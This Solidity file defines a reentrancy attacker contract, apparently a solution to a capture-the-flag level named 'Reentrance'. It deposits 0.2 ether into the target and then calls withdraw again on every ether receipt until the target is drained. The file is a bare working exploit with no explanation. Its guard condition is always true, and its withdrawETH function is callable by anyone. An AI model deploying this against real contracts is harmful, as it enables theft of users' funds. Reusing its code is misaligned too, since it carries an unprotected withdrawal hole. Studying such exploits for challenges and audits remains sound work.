// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "@openzeppelin-0_6_x/contracts/utils/Address.sol";
import '@openzeppelin-0_6_x/contracts/math/SafeMath.sol';


interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);

}

contract ReentranceAttacker {
    
    IReentrance reentrance;
    
    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }
    
    function attack() public payable {
        require(msg.value == 0.2 ether);
        reentrance.donate{value : 0.2 ether}(address(this));
        reentrance.withdraw(0.2 ether);
    }


    function withdrawETH(address payable to, uint256 amountOut) external  {
        Address.sendValue(to, amountOut);
    }


    receive() external payable {
        if(address(reentrance).balance >= 0 ) {
            reentrance.withdraw(0.2 ether);
        }

    }


}